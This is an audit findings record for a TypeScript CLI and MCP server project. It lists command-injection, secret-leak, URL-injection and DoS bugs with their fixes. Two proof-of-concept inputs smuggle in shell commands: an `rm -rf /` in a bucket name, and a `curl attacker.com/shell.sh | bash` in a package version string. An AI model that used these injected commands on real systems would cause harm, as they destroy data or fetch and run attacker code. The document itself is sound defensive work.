# ADR-061: Deep System Audit Findings — v3.5.7

**Date:** 2026-03-05
**Status:** Accepted — Triage Complete
**Context:** Comprehensive 6-agent parallel audit of CLI, MCP, memory, plugins, transfer, Docker, and test infrastructure.
**Audit Scope:** 169 source files, ~99K lines, 27 MCP tool modules, 38 commands, 35+ plugin/transfer/production files.

## Decision

Document all actionable findings from the deep system audit. File size (>500 lines) is **not** a concern — focus on bugs, security issues, dead code, and correctness problems that affect users or developers.

## Findings

### P0 — Security (Fix Immediately)

#### S-1: CRITICAL — Command Injection via GCS execSync
- **File:** `src/transfer/storage/gcs.ts:126-128, 134-135, 187-189, 218-219, 243-244, 270-271`
- **Bug:** GCS storage builds shell commands via template literal interpolation and passes to `execSync()`. `config.bucket`, `objectPath`, and `options.contentType` are interpolated without sanitization at 6 locations.
- **PoC:** `config.bucket = '"; rm -rf / #'` → arbitrary command execution.
- **Fix:** Replace `execSync(cmd)` with `execFileSync('gcloud', ['storage', 'cp', ...args])` (array form). Add bucket name validation (`/^[a-z0-9][a-z0-9._-]+$/`).
- **Impact:** Remote Code Execution if attacker controls bucket/path values.

#### S-2: ErrorHandler.sanitize() case-sensitivity bypass
- **File:** `src/production/error-handler.ts:198`
- **Bug:** `SENSITIVE_KEYS` contains mixed-case entries (`apiKey`, `api_key`), but comparison runs against `lowerKey` (already lowercased). `'apikey'.includes('apiKey')` → `false`. Fields like `apiKey` are **not redacted** in error logs.
- **Fix:** `SENSITIVE_KEYS.some(sk => lowerKey.includes(sk.toLowerCase()))`
- **Impact:** API keys, tokens, and secrets may leak into error output, logs, or crash reports.

#### S-3: Command Injection via Plugin Manager npm install
- **File:** `src/plugins/manager.ts:150-153, 280-283, 434-436`
- **Bug:** `execAsync()` runs shell with unsanitized user-provided `versionSpec` interpolated into command string. Same pattern at install, uninstall, and upgrade.
- **PoC:** `versionSpec = 'foo; curl attacker.com/shell.sh | bash'`
- **Fix:** Validate package names (`/^(@[a-z0-9-~][a-z0-9-._~]*\/)?[a-z0-9-~][a-z0-9-._~]*(@[a-z0-9._-]+)?$/`). Use `execFileSync('npm', ['install', '--prefix', dir, spec])`.
- **Impact:** Shell injection via malicious package names.

#### S-4: No IPFS CID validation before HTTP fetch
- **File:** `src/transfer/ipfs/client.ts:133`
- **Bug:** `fetchFromIPFS(cid)` constructs gateway URLs without calling `isValidCID(cid)` first. Malformed or injected CID strings are passed directly into HTTP requests.
- **Fix:** Add `if (!isValidCID(cid)) return null;` guard at top of `fetchFromIPFS`, `fetchFromIPFSWithMetadata`, `isPinned`, `checkAvailability`.
- **Impact:** URL injection via crafted CID strings.

#### S-5: MCP Server Unbounded stdin Buffer (DoS)
- **File:** `src/mcp-server.ts:349-371`
- **Bug:** Stdio transport reads stdin with `buffer += chunk.toString()` but has no size limit. Malicious client can send arbitrarily large payloads → OOM.
- **Fix:** Add `MAX_BUFFER_SIZE = 10 * 1024 * 1024` (10MB) check before processing. Reject oversized messages with JSON-RPC error.
- **Impact:** Denial of Service via memory exhaustion.

### P1 — Correctness (Fix This Sprint)

#### C-1: Dead lazy loading in commands/index.ts
- **File:** `src/commands/index.ts`
- **Bug:** `commandLoaders` map, `loadCommand()`, and `loadedCommands` cache implement lazy loading, but lines 111–145 synchronously import and pre-populate **all 34+ commands** at module level. The lazy infrastructure never executes.
- **Fix:** Either (a) remove dead `commandLoaders`/`loadCommand`/`loadedCommands` code, or (b) convert lines 111–145 to actually use `commandLoaders` with `getCommandAsync()`.
- **Impact:** ~200ms startup overhead claimed to be solved is not. Dead code misleads contributors.

#### C-2: PluginManager singleton ignores baseDir after first call
- **File:** `src/plugins/manager.ts:506-517`
- **Bug:** `getPluginManager(baseDir)` creates singleton on first call. Subsequent calls with a **different** `baseDir` silently return the wrong instance.
- **Fix:** Either warn when `baseDir` differs, accept a key parameter, or document singleton constraint.
- **Impact:** Plugin operations may target wrong directory if called from different contexts.

#### C-3: Missing JSON.parse error handling in CFP deserializer
- **File:** `src/transfer/serialization/cfp.ts:146`
- **Bug:** `deserializeCFP()` calls `JSON.parse(str)` without try/catch. Corrupt `.cfp` files throw generic "Unexpected token" instead of descriptive "Invalid CFP file" error.
- **Fix:** Wrap in try/catch with `throw new Error('Invalid CFP file: ' + e.message)`.
- **Impact:** Poor error messages when loading corrupt transfer files.

#### C-4: Simulated 500ms delay in IPFS demo upload
- **File:** `src/transfer/ipfs/upload.ts:271`
- **Bug:** `await new Promise(resolve => setTimeout(resolve, 500))` adds artificial delay in demo mode.
- **Fix:** Remove or reduce to 0ms in non-interactive contexts.
- **Impact:** Slows tests and CI unnecessarily.

#### C-5: Dead serialization formats (CBOR, MessagePack)
- **File:** `src/transfer/serialization/cfp.ts:125-138`
- **Bug:** `serializeToBuffer` accepts `cbor`, `cbor.gz`, `cbor.zstd`, `msgpack` but all fall back to JSON with `console.warn`. The `SerializationFormat` type advertises unsupported formats.
- **Fix:** Either implement CBOR/MessagePack or narrow `SerializationFormat` to `'json'` only.
- **Impact:** Silent data format fallback may surprise users expecting binary serialization.

### P2 — Code Quality (Fix When Convenient)

#### Q-1: Regex global flag latent bug in PII detection
- **File:** `src/transfer/anonymization/index.ts:17-26`
- **Bug:** `PII_PATTERNS` uses regex with `g` flag. Currently safe because `replace()` resets `lastIndex`, but any future use of `regex.test()` or `regex.exec()` in a loop would fail intermittently.
- **Fix:** Remove `g` flag or document constraint.

#### Q-2: Console logging in library code
- **Files:** `src/transfer/ipfs/client.ts`, `src/transfer/ipfs/upload.ts`, `src/plugins/manager.ts`
- **Bug:** Direct `console.log/warn/error` calls instead of injectable logger. Makes testing noisy, prevents output control.
- **Fix:** Accept logger in constructor or use a shared logger abstraction.

#### Q-3: Duplicate GCS command patterns
- **File:** `src/transfer/storage/gcs.ts`
- **Bug:** Multiple functions build `gcloud storage` commands with repeated `projectArg` construction.
- **Fix:** Extract `buildGcloudCmd(action, args, project?)` helper.

#### Q-4: Missing input validation on command flags
- **Files:** Multiple command files in `src/commands/`
- **Bug:** `ctx.flags` values used in file paths, port numbers, and topology types without validation.
- **Fix:** Add shared validation layer that all commands pass through before executing action.

### P2 — Defense in Depth

#### D-1: Prototype pollution via Object.assign in config import
- **File:** `src/mcp-tools/config-tools.ts:348`
- **Fix:** Filter `__proto__`, `constructor`, `prototype` keys before `Object.assign`.

#### D-2: No input length validation on MCP memory parameters
- **File:** `src/mcp-tools/memory-tools.ts`
- **Fix:** Add bounds: keys max 1024 chars, values max 1MB, queries max 4096 chars.

## Security Controls Verified (PASS)

| Control | File | Mechanism |
|---------|------|-----------|
| Path traversal prevention | session-tools.ts:39 | `sessionId.replace(/[^a-zA-Z0-9_-]/g, '_')` |
| Path validation | daemon.ts:158-180 | `validatePath()` blocks null bytes, shell metacharacters, traversal |
| Argument-array spawn | daemon.ts:234 | `spawn(execPath, [args])` not shell string |
| Git ref validation | diff-classifier.ts:367-382 | Whitelist regex + 256-char limit |
| Argument-array git | diff-classifier.ts:403 | `execFileSync('git', [...args])` |
| Language whitelist | enhanced-model-router.ts:570 | `SAFE_LANGUAGES` array, not blacklist |
| Doctor commands | doctor.ts | String literals only, no user input |
| Terminal tools | terminal-tools.ts:148 | State tracking only, no exec |
| Preinstall script | bin/preinstall.cjs | No-op (comment only) |
| No hardcoded secrets | all src/*.ts | Zero matches across 99K lines |

## Summary Matrix

| ID | Priority | Category | File | Status |
|----|----------|----------|------|--------|
| S-1 | **P0** | RCE | storage/gcs.ts | **Fixed** |
| S-2 | **P0** | Secret Leak | error-handler.ts | **Fixed** |
| S-3 | **P0** | Shell Injection | plugins/manager.ts | **Fixed** |
| S-4 | **P0** | URL Injection | ipfs/client.ts | **Fixed** |
| S-5 | **P0** | DoS | mcp-server.ts | **Fixed** |
| C-1 | **P1** | Dead Code | commands/index.ts | **Fixed** |
| C-2 | **P1** | Correctness | plugins/manager.ts | **Fixed** |
| C-3 | **P1** | Error Handling | serialization/cfp.ts | **Fixed** |
| C-4 | **P1** | Performance | ipfs/upload.ts | **Fixed** |
| C-5 | **P1** | Dead Code | serialization/cfp.ts | **Fixed** |
| D-1 | **P2** | Prototype Pollution | config-tools.ts | **Fixed** |
| D-2 | **P2** | Input Validation | memory-tools.ts | **Fixed** |
| Q-1 | **P2** | Latent Bug | anonymization/index.ts | Open |
| Q-2 | **P2** | Code Quality | ipfs/, plugins/ | Open |
| Q-3 | **P2** | Duplication | storage/gcs.ts | Open |
| Q-4 | **P2** | Validation | commands/ | Open |

**Total:** 5 P0 (security), 5 P1 (correctness), 6 P2 (quality)

## Test Coverage Achieved

| Agent | Test File | Tests |
|-------|-----------|-------|
| CLI Commands + Init | `commands-deep.test.ts` | 399 |
| MCP Tools + Server | `mcp-tools-deep.test.ts` | 105 |
| Plugins + Transfer | `plugins-transfer-deep.test.ts` | 204 |
| Docker + Integration | `integration-docker.test.ts` | 95 |
| Existing Fixes + Coverage | `cli.test.ts` (fixed), `parser.test.ts`, `output.test.ts`, `suggest.test.ts`, `config-adapter-deep.test.ts` | 182 |
| Memory + RuVector | `memory-ruvector-deep.test.ts` | 145 |
| Security Audit | `security-audit.test.ts` | 25 |
| **Existing (pre-audit)** | 13 files | 441 |
| **Total** | **22 files** | **~1,600** |

## Consequences

- **P0 security fixes (S-1 through S-5) must be applied in next patch release** — GCS RCE is highest priority
- P1 correctness fixes are safe for the next sprint
- P2 items are tracked for backlog
- Test suite expanded from 441 → ~1,600 tests across 22 files (all passing)
- Security audit score: 6.5/10 — strong in daemon/session/git areas, weak in GCS/plugin shell usage
- 10 security controls verified working (path traversal, git ref, argument-array spawn, no secrets)
